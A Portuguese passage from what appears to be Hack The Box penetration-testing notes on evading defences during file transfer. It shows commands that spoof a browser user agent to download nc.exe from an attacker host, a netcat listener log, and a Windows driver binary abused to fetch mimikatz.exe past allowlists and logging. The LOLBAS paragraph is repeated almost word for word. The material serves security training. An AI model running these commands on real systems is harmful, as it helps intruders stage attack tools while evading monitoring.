Se administradores ou defensores diligentes tiverem colocado qualquer um desses User Agents na lista negra, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contém um parâmetro UserAgent, que permite alterar o user agent padrão para um que emule o Internet Explorer, Firefox, Chrome, Opera ou Safari.

#### Listando agentes de usuário
```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Invocando Invoke-WebRequest para baixar nc.exe usando um Chrome User Agent:
#### Solicitação com o Chrome User Agent
```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```shell-session
NycolasES6@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```


## LOLBAS / GTFOBins
Se você não pode usar PowerShell ou Netcat devido a restrições de lista de permissões ou se o registro de linha de comando está monitorando suas ações, uma alternativa é usar um "LOLBIN" (Living Off The Land Binary).

Esses são binários legítimos do sistema que podem ser explorados para tarefas maliciosas. Um exemplo é o **Intel Graphics Driver para Windows 10 (GfxDownloadWrapper.exe)**, que possui uma funcionalidade embutida para baixar arquivos de configuração e pode ser utilizado para transferir arquivos de maneira discreta.

#### Transferindo arquivo com GfxDownloadWrapper.exe
```powershell-session
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Se a lista de permissões de aplicativos impede o uso de ferramentas como PowerShell ou Netcat e o registro de linha de comando gera alertas, você pode usar "LOLBAS" (living off the land binaries), ou binários de confiança deslocada. Um exemplo é o Intel Graphics Driver para Windows 10 (GfxDownloadWrapper.exe), que pode ser usado para baixar arquivos de configuração. O projeto LOLBAS é uma boa referência para encontrar esses binários, e o equivalente no Linux é o projeto GTFOBins, que lista binários comuns para transferências de arquivos.